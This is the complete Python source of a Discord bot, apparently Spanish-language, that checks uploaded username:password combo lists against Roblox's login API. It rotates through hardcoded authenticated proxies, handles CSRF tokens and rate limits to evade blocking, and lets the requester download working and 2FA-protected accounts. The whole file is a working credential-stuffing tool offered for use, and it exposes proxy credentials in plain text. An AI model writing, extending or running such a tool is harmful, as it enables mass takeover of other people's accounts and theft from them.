#!/usr/bin/env python3
"""
Roblox Checker Bot
Comando: /rbx-checker  (file)
Variables: DISCORD_TOKEN, CONCURRENCY, TIMEOUT, PROXY_SCHEME (opcionales salvo el token)
"""

import asyncio
import io
import json
import os
import re
import time
from collections import deque
from datetime import datetime, timezone
from email.utils import parsedate_to_datetime

import aiohttp
import discord
from discord import app_commands
from discord.ext import commands

try:
    from aiohttp_socks import ProxyConnector
except ImportError:
    ProxyConnector = None

TOKEN = os.getenv("DISCORD_TOKEN", "").strip()
CONCURRENCY = max(1, int(os.getenv("CONCURRENCY", "15")))
TIMEOUT = float(os.getenv("TIMEOUT", "20"))
PROXY_SCHEME = os.getenv("PROXY_SCHEME", "http").strip().lower()
MAX_COMBOS = 50_000
MAX_FILE = 8 * 1024 * 1024
MAX_RETRY_AFTER = 30.0
PROXY_PENALTY = 20.0
STALL_WARN = 60
EDIT_EVERY = 1.5
HEALTH_EVERY = 300

LOG_MAX = 5000
LOG_BLOCK = 950

LOGIN_URL = "https://auth.roblox.com/v2/login"
UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
)
BASE_HEADERS = {
    "User-Agent": UA,
    "Content-Type": "application/json",
    "Accept": "application/json",
    "Origin": "https://www.roblox.com",
    "Referer": "https://www.roblox.com/",
}

RAW_PROXIES = """
31.59.20.176:6754:qgvnbvdj:y9o46xt75m0k
45.38.107.97:6014:qgvnbvdj:y9o46xt75m0k
64.137.96.74:6641:qgvnbvdj:y9o46xt75m0k
198.23.243.226:6361:qgvnbvdj:y9o46xt75m0k
38.154.185.97:6370:qgvnbvdj:y9o46xt75m0k
84.247.60.125:6095:qgvnbvdj:y9o46xt75m0k
142.111.67.146:5611:qgvnbvdj:y9o46xt75m0k
191.96.254.138:6185:qgvnbvdj:y9o46xt75m0k
31.58.9.4:6077:qgvnbvdj:y9o46xt75m0k
198.46.161.42:5092:qgvnbvdj:y9o46xt75m0k
"""


# ------------------------------------------------------------------ proxies
class Proxy:
    __slots__ = ("host", "port", "user", "pw")

    def __init__(self, host: str, port: str, user: str = "", pw: str = ""):
        self.host = host
        self.port = port
        self.user = user
        self.pw = pw

    @property
    def label(self) -> str:
        base = f"{self.host}:{self.port}"
        return f"{base}:{self.user}:{self.pw}" if self.user else base

    @property
    def url(self) -> str:
        return f"{PROXY_SCHEME}://{self.host}:{self.port}"

    @property
    def auth(self):
        if not self.user:
            return None
        return aiohttp.BasicAuth(self.user, self.pw)

    @property
    def con_auth(self) -> str:
        if not self.user:
            return self.url
        return f"{PROXY_SCHEME}://{self.user}:{self.pw}@{self.host}:{self.port}"

    def __eq__(self, otro):
        return isinstance(otro, Proxy) and otro.label == self.label

    def __hash__(self):
        return hash(self.label)

    def __repr__(self):
        return f"<Proxy {self.label}>"


def _parse_proxies(raw: str) -> list[Proxy]:
    out: list[Proxy] = []
    for line in raw.strip().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split(":")
        if len(parts) == 4:
            out.append(Proxy(parts[0], parts[1], parts[2], parts[3]))
        elif len(parts) == 2:
            out.append(Proxy(parts[0], parts[1]))
    return out


TODOS: list[Proxy] = _parse_proxies(RAW_PROXIES)
PROXIES: list[Proxy] = list(TODOS)
MUERTOS: list[Proxy] = []
AUTH_FALLIDA: list[Proxy] = []
PROXY_COOLDOWN: dict[str, float] = {}
GLOBAL_COOLDOWN = 0.0
_proxy_i = 0


def next_proxy() -> Proxy | None:
    global _proxy_i
    if not PROXIES:
        return None
    ahora = time.monotonic()
    for _ in range(len(PROXIES)):
        _proxy_i = (_proxy_i + 1) % len(PROXIES)
        p = PROXIES[_proxy_i]
        if PROXY_COOLDOWN.get(p.label, 0) <= ahora:
            return p
    return min(PROXIES, key=lambda p: PROXY_COOLDOWN.get(p.label, 0))


def penalizar(proxy: Proxy | None, segundos: float):
    if proxy:
        PROXY_COOLDOWN[proxy.label] = max(
            PROXY_COOLDOWN.get(proxy.label, 0), time.monotonic() + segundos
        )


async def wait_cooldown(proxy: Proxy | None, job=None) -> bool:
    while True:
        if job and job.stopped:
            return False
        ahora = time.monotonic()
        hasta = max(GLOBAL_COOLDOWN, PROXY_COOLDOWN.get(proxy.label, 0) if proxy else 0)
        left = hasta - ahora
        if left <= 0:
            return True
        await asyncio.sleep(min(left, 0.5))


def retry_delay(r_headers) -> float:
    for header in ("retry-after", "x-ratelimit-reset", "x-ratelimit-reset-seconds"):
        raw = r_headers.get(header)
        if not raw:
            continue
        try:
            return min(max(float(raw), 0.5), MAX_RETRY_AFTER)
        except ValueError:
            try:
                when = parsedate_to_datetime(raw)
                if when.tzinfo is None:
                    when = when.replace(tzinfo=timezone.utc)
                delta = (when - datetime.now(timezone.utc)).total_seconds()
                return min(max(delta, 0.5), MAX_RETRY_AFTER)
            except Exception:
                continue
    return 4.0


# ------------------------------------------------------------------ salud proxies
async def _probar_proxy(p: Proxy) -> str:
    """Devuelve 'ok', 'auth' (407) o 'muerto'."""
    try:
        if PROXY_SCHEME.startswith("socks") and ProxyConnector is not None:
            connector = ProxyConnector.from_url(p.con_auth, rdns=True)
            sesion = aiohttp.ClientSession(
                headers=BASE_HEADERS,
                connector=connector,
                timeout=aiohttp.ClientTimeout(total=15, connect=8),
            )
        else:
            sesion = aiohttp.ClientSession(
                headers=BASE_HEADERS,
                timeout=aiohttp.ClientTimeout(total=15, connect=8),
                connector=aiohttp.TCPConnector(ssl=False),
            )

        async with sesion:
            kwargs = {}
            if not PROXY_SCHEME.startswith("socks"):
                kwargs = {"proxy": p.url, "proxy_auth": p.auth}
            async with sesion.post(LOGIN_URL, json={}, **kwargs) as r:
                if r.status == 407:
                    return "auth"
                if r.status in (400, 401, 403, 429):
                    return "ok"
                return "ok" if r.status < 500 else "muerto"
    except Exception:
        return "muerto"


async def health_check(silencioso: bool = False) -> tuple[int, int, int]:
    global PROXIES
    if not TODOS:
        return 0, 0, 0

    objetivo = MUERTOS + AUTH_FALLIDA if silencioso else TODOS
    if not objetivo:
        return len(PROXIES), 0, 0

    res = await asyncio.gather(*(_probar_proxy(p) for p in objetivo))
    ok = [p for p, r in zip(objetivo, res) if r == "ok"]
    mal_auth = [p for p, r in zip(objetivo, res) if r == "auth"]
    caidos = [p for p, r in zip(objetivo, res) if r == "muerto"]

    if silencioso:
        for p in ok:
            if p in MUERTOS:
                MUERTOS.remove(p)
            if p in AUTH_FALLIDA:
                AUTH_FALLIDA.remove(p)
            PROXY_COOLDOWN.pop(p.label, None)
        PROXIES = [p for p in TODOS if p not in MUERTOS and p not in AUTH_FALLIDA]
    else:
        MUERTOS[:] = caidos
        AUTH_FALLIDA[:] = mal_auth
        PROXIES = ok

    if not silencioso:
        print(f"Health check: {len(ok)}/{len(TODOS)} operativos")
        for p in caidos:
            print(f"  sin conexión: {p.label}")
        for p in mal_auth:
            print(f"  credenciales rechazadas (407): {p.label}")

    return len(PROXIES), len(MUERTOS), len(AUTH_FALLIDA)


async def health_loop():
    while True:
        await asyncio.sleep(HEALTH_EVERY)
        try:
            if MUERTOS or AUTH_FALLIDA:
                rec, _, _ = await health_check(silencioso=True)
                print(f"Reintento de proxies, operativos ahora: {rec}")
        except Exception as e:
            print(f"health_loop: {e}")


# ------------------------------------------------------------------ combos
USERNAME_RE = re.compile(r"^[A-Za-z0-9_]{3,20}$")
EMAIL_RE = re.compile(r"^[^@\s]{1,64}@[^@\s]{1,190}\.[A-Za-z]{2,10}$")
PASSWORD_RE = re.compile(r"^\S{1,120}$")

LISTA_PREFIJO = re.compile(r"^(?:[-*•·>]+|\d{1,4}[.)])\s+")
BASURA = ("#", "//", "http://", "https://", "www.", "[", "{")


def _limpiar(linea: str) -> str:
    linea = linea.strip().lstrip("\ufeff")
    linea = LISTA_PREFIJO.sub("", linea)
    return linea.strip().strip("`\"'").strip()


def _separar(linea: str) -> tuple[str, str] | None:
    if ":" in linea:
        user, pw = linea.split(":", 1)
    elif "|" in linea:
        user, pw = linea.split("|", 1)
    elif ";" in linea:
        user, pw = linea.split(";", 1)
    elif linea.count(" ") == 1:
        user, pw = linea.split(" ", 1)
    else:
        return None
    return user.strip(), pw.strip()


def es_usuario(valor: str) -> bool:
    return bool(USERNAME_RE.match(valor) or EMAIL_RE.match(valor))


def parse_combos(texto: str) -> tuple[list[tuple[str, str]], int]:
    vistos = set()
    validos: list[tuple[str, str]] = []
    ignoradas = 0

    for bruta in texto.splitlines():
        try:
            linea = _limpiar(bruta)
        except Exception:
            ignoradas += 1
            continue
        if not linea or linea.lower().startswith(BASURA):
            ignoradas += 1
            continue
        partes = _separar(linea)
        if not partes:
            ignoradas += 1
            continue
        user, pw = partes
        if not es_usuario(user) or not PASSWORD_RE.match(pw):
            ignoradas += 1
            continue
        clave = (user.lower(), pw)
        if clave in vistos:
            ignoradas += 1
            continue
        vistos.add(clave)
        validos.append((user, pw))
        if len(validos) >= MAX_COMBOS:
            break

    return validos, ignoradas


def build_file(lines: list[str], name: str) -> discord.File:
    texto = "\n".join(lines) + "\n"
    buf = io.BytesIO(texto.encode("utf-8")[:2_000_000])
    return discord.File(buf, filename=name)


def barra(done: int, total: int, ancho: int = 16) -> str:
    if total <= 0:
        return "░" * ancho
    filled = min(ancho, int(ancho * done / total))
    return "█" * filled + "░" * (ancho - filled)


# ------------------------------------------------------------------ worker
class Worker:
    __slots__ = ("session", "csrf")

    def __init__(self):
        self.session = aiohttp.ClientSession(
            headers=BASE_HEADERS,
            timeout=aiohttp.ClientTimeout(total=TIMEOUT, connect=8),
            connector=aiohttp.TCPConnector(ssl=False, limit=4),
            cookie_jar=aiohttp.CookieJar(unsafe=True),
        )
        self.csrf: dict[str, str] = {}

    async def close(self):
        if not self.session.closed:
            await self.session.close()


async def _login(w: Worker, proxy: Proxy | None, payload: dict):
    """Devuelve (status, headers, body). Credenciales siempre explícitas."""
    if proxy and PROXY_SCHEME.startswith("socks") and ProxyConnector is not None:
        connector = ProxyConnector.from_url(proxy.con_auth, rdns=True)
        async with aiohttp.ClientSession(
            headers=BASE_HEADERS,
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=TIMEOUT, connect=8),
        ) as s:
            async with s.post(LOGIN_URL, json={}) as r:
                csrf = r.headers.get("x-csrf-token")
            h = {"x-csrf-token": csrf} if csrf else {}
            async with s.post(LOGIN_URL, json=payload, headers=h) as r:
                return r.status, r.headers, await r.text()

    clave = proxy.label if proxy else "directo"
    csrf = w.csrf.get(clave)
    if not csrf:
        async with w.session.post(
            LOGIN_URL, json={}, proxy=proxy.url if proxy else None,
            proxy_auth=proxy.auth if proxy else None,
        ) as r:
            csrf = r.headers.get("x-csrf-token")
            if csrf:
                w.csrf[clave] = csrf
    h = {"x-csrf-token": csrf} if csrf else {}
    async with w.session.post(
        LOGIN_URL, json=payload, headers=h, proxy=proxy.url if proxy else None,
        proxy_auth=proxy.auth if proxy else None,
    ) as r:
        return r.status, r.headers, await r.text()


async def check_one(w: Worker, user: str, pw: str, job=None):
    """Devuelve dict de resultado, o None si se detuvo el job."""
    ctype = "Email" if "@" in user else "Username"
    payload = {"ctype": ctype, "cvalue": user, "password": pw}

    cadena: list[Proxy | None] = []
    if PROXIES:
        cadena.append(next_proxy())
        cadena.append(next_proxy())
    cadena.append(None)

    for proxy in cadena:
        intentos = 0
        esperas = 0
        while intentos < 2:
            if job and job.stopped:
                return None
            if not await wait_cooldown(proxy, job):
                return None

            try:
                status, headers, body = await _login(w, proxy, payload)
            except asyncio.TimeoutError:
                penalizar(proxy, PROXY_PENALTY)
                if proxy:
                    break
                if intentos < 1:
                    intentos += 1
                    continue
                return {"status": "error", "note": "timeout directo", "tipo": "timeout"}
            except aiohttp.ClientError as e:
                penalizar(proxy, PROXY_PENALTY)
                if proxy:
                    break
                if intentos < 1:
                    intentos += 1
                    continue
                return {"status": "error", "note": f"{type(e).__name__} directo", "tipo": "proxy"}
            except Exception as e:
                return {"status": "error", "note": str(e)[:60], "tipo": "error"}

            if status == 407:
                penalizar(proxy, PROXY_PENALTY * 3)
                w.csrf.pop(proxy.label if proxy else "directo", None)
                if proxy and proxy not in AUTH_FALLIDA:
                    AUTH_FALLIDA.append(proxy)
                    if proxy in PROXIES:
                        PROXIES.remove(proxy)
                return {"status": "error", "note": "407 auth proxy", "tipo": "proxy"}

            if status == 200:
                try:
                    data = json.loads(body)
                except Exception:
                    data = {}
                u = (data or {}).get("user") or {}
                return {"status": "valid", "username": u.get("name") or user}

            if status == 403:
                nuevo = headers.get("x-csrf-token")
                if nuevo:
                    w.csrf[proxy.label if proxy else "directo"] = nuevo
                ctype_h = (headers.get("rblx-challenge-type") or "").lower()
                challenge = headers.get("rblx-challenge-id")
                low = body.lower()

                if "twostep" in ctype_h or "twostep" in low or "two-step" in low:
                    return {"status": "2fa"}
                if challenge or "captcha" in low or "challenge" in low:
                    return {"status": "bad", "note": "captcha", "tipo": "captcha"}

                if intentos < 1:
                    intentos += 1
                    w.csrf.pop(proxy.label if proxy else "directo", None)
                    continue
                return {"status": "bad", "note": "challenge", "tipo": "captcha"}

            if status in (400, 401):
                return {"status": "bad"}

            if status == 429:
                esperas += 1
                delay = retry_delay(headers)
                penalizar(proxy, delay)
                if delay >= 15:
                    globals()["GLOBAL_COOLDOWN"] = max(
                        GLOBAL_COOLDOWN, time.monotonic() + delay
                    )
                if esperas > 4:
                    return {"status": "error", "note": "rate limit", "tipo": "429"}
                continue

            if status >= 500:
                penalizar(proxy, 5)
                if intentos < 1:
                    intentos += 1
                    continue
                return {"status": "error", "note": f"HTTP {status}", "tipo": "http"}

            return {"status": "error", "note": f"HTTP {status}", "tipo": "http"}

    return {"status": "error", "note": "cadena de proxies agotada", "tipo": "proxy"}


# ------------------------------------------------------------------ job
class Job:
    def __init__(self, owner: int, combos: list[tuple[str, str]], ignoradas: int = 0):
        self.owner = owner
        self.pending = deque(combos)
        self.total = len(combos)
        self.ignoradas = ignoradas
        self.checked = 0
        self.current = "-"
        self.inflight = 0
        self.good: list[str] = []
        self.twofa: list[str] = []
        self.bad: list[str] = []
        self.errors: list[str] = []
        self.logs: deque[str] = deque(maxlen=LOG_MAX)
        self.contadores = {"429": 0, "captcha": 0, "timeout": 0, "proxy": 0, "http": 0, "fatal": 0}
        self.ultimo_avance = time.monotonic()
        self.paused = asyncio.Event()
        self.paused.set()
        self.stopped = False
        self.finished = False
        self.gen = 0
        self.message: discord.Message | None = None
        self.err_message: discord.Message | None = None
        self.view: "JobView | None" = None
        self.run_task: asyncio.Task | None = None
        self._editor: asyncio.Task | None = None
        self._watchdog: asyncio.Task | None = None

    @property
    def done(self) -> int:
        return len(self.good) + len(self.twofa) + len(self.bad) + len(self.errors)

    def log(self, tipo: str, mensaje: str):
        self.logs.append(f"[{time.strftime('%H:%M:%S')}] {tipo:<7} {mensaje}")
        clave = tipo.lower()
        if clave in self.contadores:
            self.contadores[clave] += 1

    async def _record(self, user: str, pw: str, res: dict):
        combo = f"{user}:{pw}"
        st = res["status"]
        if st == "valid":
            self.good.append(combo)
        elif st == "2fa":
            self.twofa.append(combo)
        elif st == "bad":
            self.bad.append(combo)
        else:
            self.errors.append(f"{combo}  # {res.get('note', 'error')}")
        tipo = res.get("tipo")
        if tipo:
            self.log(tipo.upper(), f"{user} · {res.get('note') or tipo}")
        self.checked += 1
        self.ultimo_avance = time.monotonic()

    async def _worker(self, w: Worker):
        try:
            while True:
                await self.paused.wait()
                if self.stopped:
                    return
                try:
                    user, pw = self.pending.popleft()
                except IndexError:
                    return
                self.current = f"{user}:{pw}"
                self.inflight += 1
                try:
                    res = await check_one(w, user, pw, self)
                finally:
                    self.inflight -= 1
                if res is None:
                    self.pending.appendleft((user, pw))
                    return
                await self._record(user, pw, res)
        finally:
            await w.close()

    async def run(self):
        self.gen += 1
        gen = self.gen
        n = min(CONCURRENCY, max(self.total, 1))
        workers = [Worker() for _ in range(n)]
        try:
            await asyncio.gather(*(self._worker(w) for w in workers))
        except Exception as e:
            self.log("FATAL", repr(e)[:150])
            self.stopped = True
        finally:
            for w in workers:
                try:
                    await w.close()
                except Exception:
                    pass
            if gen == self.gen and not self.pending:
                self.finished = True
            await self.refresh()

    async def watchdog(self):
        avisado = 0.0
        while not self.finished:
            await asyncio.sleep(10)
            quieto = time.monotonic() - self.ultimo_avance
            if quieto >= STALL_WARN and quieto - avisado >= STALL_WARN:
                avisado = quieto
                ahora = time.monotonic()
                bloqueados = sum(1 for t in PROXY_COOLDOWN.values() if t > ahora)
                self.log(
                    "WARN",
                    f"sin avance {int(quieto)}s · {bloqueados} proxies en espera "
                    f"· operativos {len(PROXIES)}/{len(TODOS)}",
                )
                await self.refresh()

    def embed(self, final: bool = False) -> discord.Embed:
        pct = self.done * 100 // max(self.total, 1)
        e = discord.Embed(
            title="Roblox Checker",
            colour=0x2ECC71 if self.good else (0x95A5A6 if not final else 0xE74C3C),
        )
        e.add_field(name="Archivo", value=f"**{self.total:,}** combos", inline=True)
        e.add_field(name="Checkeados", value=f"**{self.done:,}** ({pct}%)", inline=True)
        e.add_field(name="Restantes", value=f"**{max(self.total - self.done, 0):,}**", inline=True)
        e.add_field(name="Progreso", value=f"`{barra(self.done, self.total)}`", inline=False)
        e.add_field(name="Buenas", value=f"`{len(self.good)}`", inline=True)
        e.add_field(name="2FA", value=f"`{len(self.twofa)}`", inline=True)
        e.add_field(name="Malas", value=f"`{len(self.bad) + len(self.errors)}`", inline=True)
        if self.ignoradas:
            e.add_field(name="Ignoradas", value=f"`{self.ignoradas:,}` líneas sin formato", inline=False)
        e.add_field(name="Cuenta actual", value=f"```{(self.current or '-')[:80]}```", inline=False)
        if self.finished:
            estado = "Terminado"
        elif self.stopped:
            estado = "Detenido"
        else:
            estado = "Checkeando"
        e.set_footer(
            text=f"{estado} · {self.inflight} en vuelo · {len(PROXIES)}/{len(TODOS)} proxies operativos"
        )
        return e

    def errors_embed(self) -> discord.Embed:
        c = self.contadores
        e = discord.Embed(title="Registro de errores", colour=0xE74C3C)
        e.add_field(name="429 / bloqueos", value=f"`{c['429']}`", inline=True)
        e.add_field(name="Captchas", value=f"`{c['captcha']}`", inline=True)
        e.add_field(name="Timeouts", value=f"`{c['timeout']}`", inline=True)
        e.add_field(name="Fallos de proxy", value=f"`{c['proxy']}`", inline=True)
        e.add_field(name="HTTP raros", value=f"`{c['http']}`", inline=True)
        e.add_field(name="Fatales", value=f"`{c['fatal']}`", inline=True)

        ahora = time.monotonic()
        libres = sum(1 for p in PROXIES if PROXY_COOLDOWN.get(p.label, 0) <= ahora)
        e.add_field(
            name="Proxies",
            value=(
                f"`{libres}/{len(PROXIES)}` libres · `{len(MUERTOS)}` caídos "
                f"· `{len(AUTH_FALLIDA)}` auth rechazada "
                f"· global `{max(GLOBAL_COOLDOWN - ahora, 0):.0f}s`"
            ),
            inline=False,
        )

        if self.logs:
            texto = "\n".join(list(self.logs)[-30:])
            trozos, actual = [], ""
            for linea in texto.splitlines():
                if len(actual) + len(linea) + 1 > LOG_BLOCK:
                    trozos.append(actual)
                    actual = ""
                actual += linea + "\n"
            if actual:
                trozos.append(actual)
            for i, trozo in enumerate(trozos[:2], 1):
                e.add_field(
                    name=f"Últimos eventos ({i}/{min(len(trozos), 2)})",
                    value=f"```{trozo.strip()[:LOG_BLOCK]}```",
                    inline=False,
                )
        else:
            e.add_field(name="Últimos eventos", value="Sin eventos todavía.", inline=False)

        e.set_footer(text="Los archivos se entregan solo a quien lanzó el checkeo")
        return e

    async def refresh(self, final: bool = False):
        for msg, emb in ((self.message, self.embed(final)), (self.err_message, self.errors_embed())):
            if not msg:
                continue
            try:
                await msg.edit(embed=emb)
            except Exception:
                pass

    async def editor_loop(self):
        while not self.finished:
            await asyncio.sleep(EDIT_EVERY)
            await self.refresh()


# ------------------------------------------------------------------ vistas
class JobView(discord.ui.View):
    def __init__(self, job: Job):
        super().__init__(timeout=None)
        self.job = job

    async def _guard(self, it: discord.Interaction) -> bool:
        if it.user.id != self.job.owner:
            await it.response.send_message("Este checkeo no lo iniciaste tú.", ephemeral=True)
            return False
        return True

    async def _send(self, it: discord.Interaction, lines: list[str], name: str, vacio: str):
        if not await self._guard(it):
            return
        if not lines:
            await it.response.send_message(vacio, ephemeral=True)
            return
        await it.response.send_message(file=build_file(lines, name), ephemeral=True)

    @discord.ui.button(label="Descargar buenas", style=discord.ButtonStyle.success, custom_id="rbx_good", row=0)
    async def good(self, it: discord.Interaction, _):
        await self._send(it, self.job.good, "buenas.txt", "Todavía no hay cuentas buenas.")

    @discord.ui.button(label="Descargar 2FA", style=discord.ButtonStyle.primary, custom_id="rbx_2fa", row=0)
    async def twofa(self, it: discord.Interaction, _):
        await self._send(it, self.job.twofa, "2fa.txt", "Todavía no hay cuentas con 2FA.")

    @discord.ui.button(label="Descargar malas", style=discord.ButtonStyle.danger, custom_id="rbx_bad", row=0)
    async def bad(self, it: discord.Interaction, _):
        await self._send(it, self.job.bad + self.job.errors, "malas.txt", "Todavía no hay cuentas malas.")

    @discord.ui.button(label="Detener", style=discord.ButtonStyle.secondary, custom_id="rbx_stop", row=0)
    async def stop(self, it: discord.Interaction, _):
        if not await self._guard(it):
            return
        if self.job.finished:
            await it.response.send_message("El checkeo ya terminó.", ephemeral=True)
            return
        if self.job.stopped:
            await it.response.send_message("Ya está detenido.", ephemeral=True)
            return
        self.job.stopped = True
        self.job.paused.set()
        self.job.log("WARN", "detenido por el usuario")
        await it.response.send_message("Detenido. Usa **Seguir** para reanudar.", ephemeral=True)
        await self.job.refresh()

    @discord.ui.button(label="Seguir", style=discord.ButtonStyle.secondary, custom_id="rbx_resume", row=0)
    async def resume(self, it: discord.Interaction, _):
        if not await self._guard(it):
            return
        if self.job.finished:
            await it.response.send_message("El checkeo ya terminó.", ephemeral=True)
            return
        if not self.job.stopped:
            await it.response.send_message("Ya está corriendo.", ephemeral=True)
            return
        if not self.job.pending:
            await it.response.send_message("No quedan combos pendientes.", ephemeral=True)
            return
        self.job.stopped = False
        self.job.paused.set()
        self.job.ultimo_avance = time.monotonic()
        self.job.log("WARN", "reanudado por el usuario")
        self.job.run_task = asyncio.create_task(self.job.run())
        await it.response.send_message("Reanudado.", ephemeral=True)
        await self.job.refresh()


class ErrorsView(discord.ui.View):
    def __init__(self, job: Job):
        super().__init__(timeout=None)
        self.job = job

    @discord.ui.button(label="Descargar errores", style=discord.ButtonStyle.secondary, custom_id="rbx_errlog")
    async def descargar(self, it: discord.Interaction, _):
        if it.user.id != self.job.owner:
            await it.response.send_message("Este checkeo no lo iniciaste tú.", ephemeral=True)
            return
        if not self.job.logs:
            await it.response.send_message("No hay errores registrados.", ephemeral=True)
            return
        cabecera = [
            f"Combos: {self.job.total}",
            f"Checkeados: {self.job.done}",
            f"429: {self.job.contadores['429']} | captchas: {self.job.contadores['captcha']} "
            f"| timeouts: {self.job.contadores['timeout']} | proxies: {self.job.contadores['proxy']}",
            f"Operativos: {len(PROXIES)}/{len(TODOS)} | caídos: {len(MUERTOS)} "
            f"| auth rechazada: {len(AUTH_FALLIDA)}",
            "Proxies configurados:",
            *[f"  {p.label}" for p in TODOS],
            "-" * 40,
        ]
        await it.response.send_message(
            file=build_file(cabecera + list(self.job.logs), "errores.txt"), ephemeral=True
        )


# ------------------------------------------------------------------ bot
intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)
ACTIVE: set[int] = set()


async def sync_guild(guild: discord.Guild):
    try:
        bot.tree.copy_global_to(guild=guild)
        await bot.tree.sync(guild=guild)
        print(f"Comandos cargados en {guild.name} ({guild.id})")
    except discord.HTTPException as e:
        print(f"No pude sincronizar en {guild.name}: {e}")


@bot.event
async def on_ready():
    print(f"Proxies cargados: {len(TODOS)}")
    for p in TODOS:
        print(f"  {p.label}")
    vivos, muertos, mal_auth = await health_check()
    print(f"Operativos: {vivos} | caídos: {muertos} | auth rechazada: {mal_auth}")
    if not vivos:
        print("Sin proxies utilizables: el bot irá directo y comerá captchas")

    try:
        synced = await bot.tree.sync()
        print(f"Comandos globales sincronizados: {len(synced)}")
    except discord.HTTPException as e:
        print(f"Error en sync global: {e}")

    for guild in bot.guilds:
        await sync_guild(guild)
        await asyncio.sleep(1)

    asyncio.create_task(health_loop())
    print(f"Listo: {bot.user} | {len(bot.guilds)} servidores")


@bot.event
async def on_guild_join(guild: discord.Guild):
    await sync_guild(guild)


@bot.event
async def on_guild_remove(guild: discord.Guild):
    print(f"Salí de {guild.name} ({guild.id})")


@bot.tree.command(name="rbx-checker", description="Checkea combos de Roblox desde un archivo")
@app_commands.describe(file="Archivo .txt con un combo por línea (user:pass)")
async def rbx_checker(interaction: discord.Interaction, file: discord.Attachment):
    if interaction.user.id in ACTIVE:
        await interaction.response.send_message("Ya tienes un checkeo en curso.", ephemeral=True)
        return
    if file.size > MAX_FILE:
        await interaction.response.send_message("El archivo pasa de 8 MB.", ephemeral=True)
        return

    await interaction.response.defer(thinking=True)

    try:
        raw = await file.read()
    except Exception as e:
        await interaction.edit_original_response(content=f"No pude leer el archivo: `{e}`")
        return

    combos, ignoradas = parse_combos(raw.decode("utf-8", errors="ignore"))
    if not combos:
        await interaction.edit_original_response(
            content=(
                f"El archivo no tiene combos válidos.\n"
                f"Se ignoraron **{ignoradas:,}** líneas. Formato esperado: `usuario:contraseña`."
            )
        )
        return

    ACTIVE.add(interaction.user.id)

    job = Job(interaction.user.id, combos, ignoradas)
    job.view = JobView(job)

    await interaction.edit_original_response(embed=job.embed(), view=job.view)
    job.message = await interaction.original_response()

    job.err_message = await interaction.followup.send(
        embed=job.errors_embed(), view=ErrorsView(job), wait=True
    )

    job.run_task = asyncio.create_task(job.run())
    job._editor = asyncio.create_task(job.editor_loop())
    job._watchdog = asyncio.create_task(job.watchdog())

    async def cleanup():
        while not job.finished:
            await asyncio.sleep(2)
        ACTIVE.discard(job.owner)
        await asyncio.sleep(1800)
        for msg in (job.message, job.err_message):
            try:
                await msg.edit(view=None)
            except Exception:
                pass

    asyncio.create_task(cleanup())


if __name__ == "__main__":
    if not TOKEN:
        raise SystemExit("Falta DISCORD_TOKEN")
    bot.run(TOKEN)
